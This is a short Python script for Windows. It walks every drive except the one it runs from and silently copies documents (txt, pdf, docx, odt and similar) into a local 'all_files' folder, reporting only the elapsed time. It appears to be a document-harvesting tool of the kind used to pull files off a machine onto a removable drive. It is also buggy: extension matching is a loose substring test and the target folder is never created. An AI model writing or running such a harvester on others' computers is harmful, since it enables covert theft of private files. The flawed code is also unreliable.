from threading import Thread
from win32api import GetLogicalDriveStrings
import os
import time
import shutil


def find_files(disk):
    ext = ['txt', 'pdf', 'docx', 'dot', 'dotx', 'odt', 'ods']
    dst = os.getcwd() + "\\all_files"
    for root, dir, files in os.walk(disk):
        for i in files:
            for j in ext:
                if j in i:
                    try:
                        shutil.copyfile(f'{root}\\{i}', dst+f'\\{i}')
                    except PermissionError:
                        continue
                    # with open("log.txt", '+a', encoding='utf-8') as f:
                    #     f.write(f'{root}\\{i}\n')


def main():
    # init
    drives = GetLogicalDriveStrings()
    drives = drives.split('\\\000')[:-1]
    drives.remove(__file__[:2])
    start = time.time()
    ############################################################
    for i in drives:
        find_files(i)
    print(f'{time.time() - start}')


main()
